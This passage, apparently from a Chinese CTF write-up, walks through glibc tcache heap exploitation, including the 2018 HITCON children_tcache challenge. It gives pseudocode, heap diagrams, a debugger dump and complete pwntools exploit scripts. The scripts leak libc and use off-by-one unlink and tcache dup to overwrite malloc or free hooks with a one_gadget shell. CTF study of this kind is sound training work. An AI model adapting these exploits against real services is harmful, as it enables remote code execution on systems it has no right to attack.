    def delete(index) :
        p.sendlineafter('> ','2')
        p.sendlineafter('> ',str(index))
    for i in range(10):
        create(0xf8,'A'*0xf0)
    delete(1)
    delete(3)
    for i in range(5,10):
        delete(i)
    delete(0)
    delete(2)
    delete(4)
    for i in range(7) :
        create(0xf0,'\n')
    create(0xf0,'\n')
    create(0xf8,'\n')
    for i in range(5) :
        delete(i)
    delete(6)
    delete(5)
    show(8)
    for i in range(9) :
        p.recvuntil('> ')    #此处不太准确，根据自己环境自行修改
    data = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = data - 4111520
    log.success('libc base is :'+hex(libc_base))
    free_hook = libc_base + 4118760
    one_gadget = libc_base + 0x4f322
    log.success('free hook is :'+hex(free_hook))
    for i in range(7) :
        create(0xf0,'\n')
    create(0xf0,'\n')
    delete(0)
    delete(8)
    delete(9)
    create(0xf0,p64(free_hook))
    create(0xf0,p64(free_hook))
    create(0xf0,p64(one_gadget))
    delete(1)
    p.interactive()
### 2018 HITCON children_tcache：
这也是一道常规题，看一下伪代码可以发现也是只有一个`null-byte-one`漏洞：
    unsigned __int64 create()
    {
      signed int i; // [rsp+Ch] [rbp-2034h]
      char *dest; // [rsp+10h] [rbp-2030h]
      unsigned __int64 size; // [rsp+18h] [rbp-2028h]
      char s; // [rsp+20h] [rbp-2020h]
      unsigned __int64 v5; // [rsp+2038h] [rbp-8h]
      v5 = __readfsqword(0x28u);
      memset(&s, 0, 0x2010uLL);
      for ( i = 0; ; ++i )
      {
        if ( i > 9 )
        {
          puts(":(");
          return __readfsqword(0x28u) ^ v5;
        }
        if ( !qword_202060[i] )
          break;
      }
      printf("Size:");
      size = sub_B67();
      if ( size > 0x2000 )                          // size 避免合并top chunk
这时候的堆块情况为：
    -----------------    |   0x511       |
    |               |
    -----------------    |   0x71        |
    |               |
    -----------------    |   0x601       |
    |               |
    -----------------
利用`null-byte-one`将0x601变为0x600以此来unlink：
    for i in range(9):
        create(0x68 - i, 'b' * (0x68 - i))
        delete(0)
    create(0x68,'b'*0x60+p64(0x580))
    #gdb.attach(p)
    delete(2)
unlink后得到了一个0xb81的chunk，包括了以上三个chunk，但是其中chunk2还是有指针的，所以就能够堆块重用，使得两个指针指向chunk2，先malloc一个0x508的chunk，此时就可以leak出libc地址：
    create(0x508,'a'*0x507)
    #gdb.attach(p)
    show(0)
此时原本的chunk2变成了：
    pwndbg> x/20xg 0x55747df85760
    0x55747df85760: 0x0061616161616161  0x0000000000000671
    0x55747df85770: 0x00007fdb58b5fca0  0x00007fdb58b5fca0
    0x55747df85780: 0x0000000000000000  0x0000000000000000
所以在此malloc一个0x68大小的chunk2，就可以实现cache
dup，之后就常规操作了，改变malloc地址为one_gadget的地址，实现getshell：
    create(0x68,p64(malloc_addr)+0x5f*'a')
    create(0x68,'a'*0x67)
    create(0x68,p64(one_addr))
## EXP：
    from pwn import *
    p = process('./program')
    elf = ELF('program')
    libc = ELF('libc-2.27.so')
    context.log_level = 'debug'
    def create(size,content):
        p.sendlineafter('Your choice: ','1')
        p.sendlineafter('Size:',str(size))
        p.sendafter('Data:',content)
    def show(index) :
        p.sendlineafter('Your choice: ','2')
        p.sendlineafter('Index:',str(index))
    def delete(index) :
        p.sendlineafter('Your choice: ','3')
        p.sendlineafter('Index:',str(index))
    create(0x500, 'a' * 0x4ff)
    create(0x68, 'b' * 0x67)
    create(0x5f0, 'c' * 0x5ef)
    create(0x20, 'd' * 0x20)
    delete(1)
    delete(0)
    for i in range(9):
        create(0x68 - i, 'b' * (0x68 - i))
        delete(0)
    create(0x68,'b'*0x60+p64(0x580))
    #gdb.attach(p)
    delete(2)
    #gdb.attach(p)
    create(0x508,'a'*0x507)
    #gdb.attach(p)
    show(0)
    #gdb.attach(p)
    data = u64(p.recv(6).ljust(8,'\x00'))
    libc_base = data - 4111520
    print 'libc_base :' + hex(libc_base)
    create(0x68,'b'*0x67)
    delete(0)
    delete(2)
    malloc_addr = libc_base + libc.symbols['__malloc_hook']
    one_addr = libc_base + 0x4f322
    create(0x68,p64(malloc_addr)+0x5f*'a')
    create(0x68,'a'*0x67)
    create(0x68,p64(one_addr))
    print hex(malloc_addr)
    p.sendlineafter('Your choice: ','1')
    p.sendlineafter('Size:','10')
    p.interactive()